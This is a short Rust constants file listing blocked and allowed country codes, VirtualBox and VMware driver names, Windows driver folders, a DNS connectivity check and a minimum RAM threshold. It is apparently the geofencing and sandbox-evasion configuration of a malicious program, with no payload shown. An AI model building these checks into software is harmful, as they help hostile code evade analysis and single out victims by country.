pub const BLOCKED_COUNTRIES: &[&str] = &[
    "AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR",
    "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL",
    "PL", "PT", "RO", "SK", "SI", "ES", "SE",
    "AL", "CA", "IS", "ME", "MK", "NO", "TR", "GB", "US",
];

#[allow(dead_code)]
pub const ALLOWED_COUNTRIES: &[&str] = &[
    "RU", "BY", "UA", "KZ", "TJ", "UZ", "KG", "AM", "AZ", "GE",
    "MD", "TM",
];

pub const VM_DRIVERS: &[&str] = &[
    "VBoxGuest.sys",
    "VBoxVideo.sys",
    "VBoxWddm.sys",
    "VBoxSF.sys",
    "VBoxMouse.sys",
    "VBoxService.exe",
    "vmxnet3.sys",
    "vm3d.sys",
    "vmwvxpe.sys",
    "vmmemctl.sys",
    "vmci.sys",
    "vmhgfs.sys",
    "vmvss.sys",
    "pvscsi.sys",
    "vmblock.sys",
];

pub const VM_DRIVER_DIRS: &[&str] = &[
    r"C:\Windows\System32\drivers",
    r"C:\Windows\System32",
    r"C:\Windows\SysWOW64\drivers",
    r"C:\Windows\SysWOW64",
];

pub const NETWORK_CHECK_HOST: &str = "8.8.8.8:53";

pub const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024;
